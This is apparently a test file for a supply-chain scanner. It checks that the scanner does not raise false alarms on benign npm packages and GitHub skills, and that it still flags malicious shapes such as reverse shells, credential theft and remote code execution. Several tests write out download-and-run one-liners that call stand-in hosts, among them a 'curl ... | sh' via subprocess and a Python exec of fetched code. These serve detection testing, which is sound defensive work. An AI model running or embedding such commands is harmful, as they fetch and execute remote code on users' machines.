// Precision of `moorai scan --package` on LEGITIMATE-looking packages, and recall on the true-positive
// shapes next to them. Verdicts from this scanner are published, so a false DO-NOT-INSTALL is a false
// public accusation. Every false-positive class fixed has a synthetic fixture here; every heuristic that
// was narrowed has a true-positive twin that must keep its verdict.
//
//   node --test test/mcp-package-precision.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, mkdirSync, readdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

import { analyzePackage, parsePackageArg } from "../cli/mcp-package.mjs";
import { scanPath } from "../cli/scan-core.mjs";
import { buildEngine } from "../cli/hook-core.mjs";
import { parseGithubSpec, githubArchiveUrl } from "../cli/mcp-package/github.mjs";
import { extractRepoSubpath } from "../cli/mcp-package/archive-stream.mjs";
import { fileClass } from "../cli/mcp-package/scope.mjs";
import { registryStub, makeTgz } from "./fixtures/mcp-package/build.mjs";
import { PRECISION, PRECISION_TGZ, SKILL_REPO, COMMIT, repoTarball, codeloadStub } from "./fixtures/mcp-package/precision.mjs";

const CLI = fileURLToPath(new URL("../cli/moorai-scan.mjs", import.meta.url));
const engine = buildEngine({});
const stub = registryStub(PRECISION_TGZ);
const scan = (name) => analyzePackage({ ecosystem: "npm", name, version: null }, { fetchImpl: stub.fetchImpl, engine });
const ids = (r) => r.findings.map((f) => f.threatId);
const driving = (r) => r.findings.filter((f) => f.tier !== "notify").map((f) => f.threatId);

function unpacked(name) {
  const d = mkdtempSync(join(tmpdir(), "moorai-prec-"));
  for (const f of PRECISION[name]) {
    const p = join(d, f.name.replace(/^package\//, ""));
    mkdirSync(join(p, ".."), { recursive: true });
    writeFileSync(p, f.data);
  }
  return d;
}

// ---- false-positive classes ----

test("#65 on bundled constants: the whole-file skill gate says DO-NOT-INSTALL, package mode does not", async () => {
  assert.equal(scanPath(unpacked("constants-mcp"), { engine }).verdict, "DO-NOT-INSTALL", "precondition: the FP reproduces in the agent-surface gate");
  const r = await scan("constants-mcp");
  assert.equal(r.analysed, true);
  assert.deepEqual(driving(r), []);
  assert.ok(!ids(r).includes(65), JSON.stringify(ids(r)));
  assert.ok(["CLEAN", "CAUTION"].includes(r.verdict), r.verdict);
});

test("README install instructions, business wording, LICENSE and CHANGELOG are not findings", async () => {
  assert.notEqual(scanPath(unpacked("docs-mcp"), { engine }).verdict, "CLEAN", "precondition: the gate flags these docs");
  const r = await scan("docs-mcp");
  assert.equal(r.verdict, "CLEAN", JSON.stringify(r.findings));
});

test("injection wording in docs is a CAUTION note, reported once across README and docs/", async () => {
  const r = await scan("inject-readme-mcp");
  assert.equal(r.verdict, "CAUTION");
  assert.ok(r.findings.length >= 1 && r.findings.every((f) => f.tier === "notify"), JSON.stringify(r.findings));
  const byId = {};
  for (const f of r.findings) byId[f.threatId] = (byId[f.threatId] || 0) + 1;
  assert.ok(Object.values(byId).every((n) => n === 1), JSON.stringify(byId));
});

test("install hints, a shell `echo` hint, a browser asset import and docstrings are not remote code", async () => {
  const r = await scan("hints-mcp");
  assert.ok(!ids(r).includes("pkg-remote-code"), JSON.stringify(r.findings));
  assert.ok(!ids(r).includes("pkg-spawn-egress"), "comments/docstrings are not capabilities");
  const browser = r.findings.find((f) => f.threatId === "pkg-remote-code-browser");
  assert.equal(browser && browser.tier, "notify");
  assert.equal(r.verdict, "CAUTION");
});

test("open-browser + token fetch is an expected capability: CAUTION, not REVIEW; loopback sockets are not egress", async () => {
  const r = await scan("oauth-mcp");
  const se = r.findings.filter((f) => f.threatId === "pkg-spawn-egress");
  assert.deepEqual(se.map((f) => [f.relativePath, f.tier]), [["dist/oauth.js", "notify"]]);
  assert.equal(r.verdict, "CAUTION");
});

test("a `.npmrc` mentioned in a comment is not a credential read", async () => {
  const r = await scan("cred-comment-mcp");
  assert.ok(!ids(r).includes("pkg-credential-read-egress"), JSON.stringify(ids(r)));
});

// ---- true positives that must survive ----

test("runtime self-update (registry fetch + `npm i -g`) → REVIEW via pkg-runtime-install", async () => {
  const r = await scan("selfupdate-mcp");
  assert.deepEqual(driving(r), ["pkg-runtime-install"]);
  assert.equal(r.verdict, "REVIEW");
});

test("postinstall whose script downloads → REVIEW via pkg-install-script-download", async () => {
  const r = await scan("installdl-mcp");
  assert.ok(ids(r).includes("pkg-install-script-download"), JSON.stringify(ids(r)));
  assert.equal(r.verdict, "REVIEW");
});

test("`curl | sh` actually executed (exec call, or a live shell line) → DO-NOT-INSTALL", async () => {
  for (const name of ["exechint-mcp", "shellpipe-mcp"]) {
    const r = await scan(name);
    assert.ok(ids(r).includes("pkg-remote-code"), `${name}: ${JSON.stringify(ids(r))}`);
    assert.equal(r.verdict, "DO-NOT-INSTALL", name);
  }
});

test("remote import in server code (not a browser asset) → DO-NOT-INSTALL", async () => {
  const r = await scan("nodeimport-mcp");
  assert.ok(ids(r).includes("pkg-remote-code"));
  assert.equal(r.verdict, "DO-NOT-INSTALL");
});

test("reverse shells: Python socket+dup2+pty (heuristic) and /dev/tcp (engine #54) → DO-NOT-INSTALL", async () => {
  const py = await scan("pyrevshell-mcp");
  assert.ok(ids(py).includes("pkg-socket-shell"), JSON.stringify(ids(py)));
  assert.equal(py.verdict, "DO-NOT-INSTALL");
  const js = await scan("devtcp-mcp");
  assert.ok(js.findings.some((f) => f.threatId === 54 && f.tier === "block"), JSON.stringify(js.findings));
  assert.equal(js.verdict, "DO-NOT-INSTALL");
});

test("env dump + POST cannot be hidden inside a fake block comment", async () => {
  const r = await scan("fakecomment-mcp");
  assert.ok(ids(r).includes("pkg-env-dump-egress"), JSON.stringify(ids(r)));
  assert.equal(r.verdict, "DO-NOT-INSTALL");
});

test("reading ~/.ssh and posting it → REVIEW via pkg-credential-read-egress", async () => {
  const r = await scan("cred-read-mcp");
  assert.ok(ids(r).includes("pkg-credential-read-egress"));
  assert.equal(r.verdict, "REVIEW");
});

test("file classes: code, docs, data, skipped legal text/lockfiles, skill surface only for skills", () => {
  assert.equal(fileClass("dist/lib/constants.js"), "code");
  assert.equal(fileClass("README.md"), "doc");
  assert.equal(fileClass("PKG-INFO"), "doc");
  assert.equal(fileClass("package.json"), "data");
  assert.equal(fileClass("LICENSE"), "skip");
  assert.equal(fileClass("CHANGELOG.md"), "skip");
  assert.equal(fileClass("package-lock.json"), "skip");
  assert.equal(fileClass("dist/index.js.map"), "skip");
  assert.equal(fileClass("SKILL.md"), "doc");
  assert.equal(fileClass("SKILL.md", { skill: true }), "surface");
  assert.equal(fileClass("scripts/run.py", { skill: true }), "code");
});

test("oversized-input (#53) is linear: a 59 KB input scans in well under a second", () => {
  const text = "lorem ipsum dolor\n".repeat(3300);
  assert.ok(text.length < 60000);
  const t = Date.now();
  engine.scan(text, "prompt");
  assert.ok(Date.now() - t < 1500, `took ${Date.now() - t}ms`);
  assert.ok(engine.scan("x".repeat(60000), "prompt").some((f) => f.threat.id === 53), "still fires at 60 KB");
});

// ---- GitHub skills ----

const REPO_URL = "https://codeload.github.com/acme/skills/tar.gz/HEAD";
const gh = (path, routes = { [REPO_URL]: repoTarball(SKILL_REPO) }) => {
  const s = codeloadStub(routes);
  return { s, run: () => analyzePackage(parseGithubSpec(`acme/skills/${path}`), { fetchImpl: s.fetchImpl, engine }) };
};

test("parseGithubSpec / parsePackageArg: owner/repo/path[@ref], refuses traversal and junk", () => {
  assert.deepEqual(parsePackageArg("github:acme/skills/skills/x@v1.2"), { ecosystem: "github", name: "acme/skills", path: "skills/x", version: "v1.2" });
  assert.deepEqual(parseGithubSpec("https://github.com/acme/skills/skills/.curated/x"), { ecosystem: "github", name: "acme/skills", path: "skills/.curated/x", version: null });
  for (const bad of ["acme", "acme/../x", "acme/skills/../../etc", "ac me/skills/x", "acme/skills/x@a..b/..", "-/x/y"]) assert.equal(parseGithubSpec(bad), null, bad);
  assert.equal(githubArchiveUrl({ name: "acme/skills", version: "feature/a" }), "https://codeload.github.com/acme/skills/tar.gz/feature/a");
});

test("benign skill → CLEAN; only the path is extracted; commit reported; path never sent", async () => {
  const { s, run } = gh("skills/benign");
  const r = await run();
  assert.equal(r.analysed, true);
  assert.equal(r.kind, "skill");
  assert.equal(r.verdict, "CLEAN", JSON.stringify(r.findings));
  assert.equal(r.artifact.commit, COMMIT);
  assert.equal(r.package, "acme/skills/skills/benign@HEAD");
  assert.deepEqual(r.integrity, { algorithm: "none", verified: false });
  assert.equal(r.summary.filesTotal, 4);
  assert.deepEqual(s.urls.map((u) => u.url), [REPO_URL]);
  assert.equal(s.urls[0].opts.redirect, "error");
  assert.ok(!JSON.stringify(r).includes("SHOULD-NOT-BE-EXTRACTED"));
});

test("skill instructing `curl | sh` → REVIEW (#57); a reverse shell → DO-NOT-INSTALL (#54); injection → CAUTION", async () => {
  const inst = await gh("skills/installer").run();
  assert.equal(inst.verdict, "REVIEW", JSON.stringify(inst.findings));
  assert.ok(inst.findings.some((f) => f.threatId === 57 && f.tier === "justify"));
  const rev = await gh("skills/revshell").run();
  assert.equal(rev.verdict, "DO-NOT-INSTALL");
  const inj = await gh("skills/inject").run();
  assert.equal(inj.verdict, "CAUTION", JSON.stringify(inj.findings));
  assert.ok(inj.findings.every((f) => f.surfaceKind === "claude-skill"));
});

test("a skill's bundled script is judged by the package heuristics", async () => {
  const r = await gh("skills/badscript").run();
  assert.ok(ids(r).includes("pkg-env-dump-egress"), JSON.stringify(ids(r)));
  assert.equal(r.verdict, "DO-NOT-INSTALL");
});

test("github: missing path, 404 and a pinned ref fail closed / resolve correctly", async () => {
  const missing = await gh("skills/nope").run();
  assert.equal(missing.verdict, "REVIEW");
  assert.ok(missing.notes.some((n) => n.id === "path-not-found"));
  const s = codeloadStub({});
  const r404 = await analyzePackage(parseGithubSpec("acme/skills/skills/benign"), { fetchImpl: s.fetchImpl, engine });
  assert.equal(r404.verdict, "REVIEW");
  assert.deepEqual(r404.notes, [{ id: "download-http-404" }]);
  const url = `https://codeload.github.com/acme/skills/tar.gz/${COMMIT}`;
  const cacheDir = mkdtempSync(join(tmpdir(), "moorai-ghcache-"));
  const p = codeloadStub({ [url]: repoTarball(SKILL_REPO) });
  const ref = parseGithubSpec(`acme/skills/skills/benign@${COMMIT}`);
  await analyzePackage(ref, { fetchImpl: p.fetchImpl, engine, cacheDir });
  const again = await analyzePackage(ref, { fetchImpl: p.fetchImpl, engine, cacheDir });
  assert.equal(again.cached, true, "a full commit sha is immutable, so it is cached");
  assert.equal(p.urls.length, 1);
  const h = codeloadStub({ [REPO_URL]: repoTarball(SKILL_REPO) });
  const c2 = mkdtempSync(join(tmpdir(), "moorai-ghcache-"));
  await analyzePackage(parseGithubSpec("acme/skills/skills/benign"), { fetchImpl: h.fetchImpl, engine, cacheDir: c2 });
  assert.deepEqual(readdirSync(c2), [], "HEAD is mutable, never cached");
});

test("streaming subpath extraction refuses traversal inside the kept path and never writes outside", async () => {
  const outer = mkdtempSync(join(tmpdir(), "moorai-ghx-"));
  const dest = join(outer, "d");
  mkdirSync(dest);
  const buf = makeTgz([
    { name: "r-1/skills/x/SKILL.md", data: "ok" },
    { name: "r-1/skills/x/../../../../escape.txt", data: "bad" },
    { name: "r-1/skills/x/link", type: "2", linkname: "/etc/passwd" },
    { name: "r-1/skills/y/SKILL.md", data: "other" }
  ]);
  const st = await extractRepoSubpath(buf, dest, "skills/x");
  assert.deepEqual(readdirSync(outer), ["d"]);
  assert.deepEqual(readdirSync(dest), ["SKILL.md"]);
  assert.equal(st.rejected, 1);
  assert.equal(st.skipped, 1);
});

test("CLI: a malformed github spec exits 64", () => {
  const r = spawnSync(process.execPath, [CLI, "--package", "github:acme/../x"], { encoding: "utf8" });
  assert.equal(r.status, 64);
  assert.match(r.stderr, /github:<owner>\/<repo>\/<path>/);
});

test("inline install code is remote only when it fetches (locked-split finding)", async () => {
  const { packageHeuristics } = await import("../cli/mcp-package/heuristics.mjs");
  const { mkdtempSync, writeFileSync, mkdirSync } = await import("node:fs");
  const { tmpdir } = await import("node:os");
  const { join } = await import("node:path");
  const ids = (scripts, files = {}) => {
    const root = mkdtempSync(join(tmpdir(), "pkg-inline-"));
    writeFileSync(join(root, "package.json"), JSON.stringify({ name: "x", version: "1.0.0", scripts }));
    for (const [f, t] of Object.entries(files)) { mkdirSync(join(root, f, ".."), { recursive: true }); writeFileSync(join(root, f), t); }
    const paths = [join(root, "package.json"), ...Object.keys(files).map((f) => join(root, f))];
    return packageHeuristics(root, paths).map((f) => f.threatId || f.id);
  };
  const chmod = ids({ postinstall: `node -e "try { require('fs').chmodSync('./dist/index.js', '755') } catch (e) {}"` });
  assert.ok(!chmod.includes("pkg-install-script-remote"), `chmod one-liner flagged remote: ${chmod}`);
  assert.ok(chmod.includes("pkg-install-script"));
  const fetching = ids({ postinstall: `node -e "require('https').get('https://x.example/p').pipe(process.stdout)"` });
  assert.ok(fetching.includes("pkg-install-script-remote"), `fetching one-liner missed: ${fetching}`);
  const pyfetch = ids({ postinstall: `python3 -c "import urllib.request as u; exec(u.urlopen(u.Request(h)).read())"` });
  assert.ok(pyfetch.includes("pkg-install-script-remote"), `python fetch one-liner missed: ${pyfetch}`);
});

test("block evidence only in comments or test files is reported at review level (fresh-holdout finding)", async () => {
  const { packageHeuristics } = await import("../cli/mcp-package/heuristics.mjs");
  const { mkdtempSync, writeFileSync, mkdirSync } = await import("node:fs");
  const { tmpdir } = await import("node:os");
  const { join, dirname } = await import("node:path");
  const run = (files) => {
    const root = mkdtempSync(join(tmpdir(), "pkg-cap-"));
    for (const [f, t] of Object.entries(files)) { mkdirSync(dirname(join(root, f)), { recursive: true }); writeFileSync(join(root, f), t); }
    return packageHeuristics(root, Object.keys(files).map((f) => join(root, f))).filter((x) => x.threatId === "pkg-remote-code").map((x) => x.tier);
  };
  assert.deepEqual(run({ "pkg/scanner.py": "# sandbox.exec('curl -fsSL https://x.example/i.sh | sh') is a sample\nimport re\n" }), ["justify"]);
  assert.deepEqual(run({ "tests/test_rules.py": "import subprocess\nsubprocess.run('curl -s https://c2.example/p | sh', shell=True)\n" }), ["justify"]);
  assert.deepEqual(run({ "pkg/run.py": "import subprocess\nsubprocess.run('curl -s https://c2.example/p | sh', shell=True)\n" }), ["block"]);
});

test("the package cache key changes when the analysis rules change", async () => {
  const { readFileSync } = await import("node:fs");
  const src = readFileSync(new URL("../cli/mcp-package.mjs", import.meta.url), "utf8");
  assert.match(src, /mcp-package\/heuristics\.mjs/);
  assert.match(src, /data\/threats\.json/);
  assert.doesNotMatch(src, /const ANALYSIS_REV = "[^"]*";/);
});
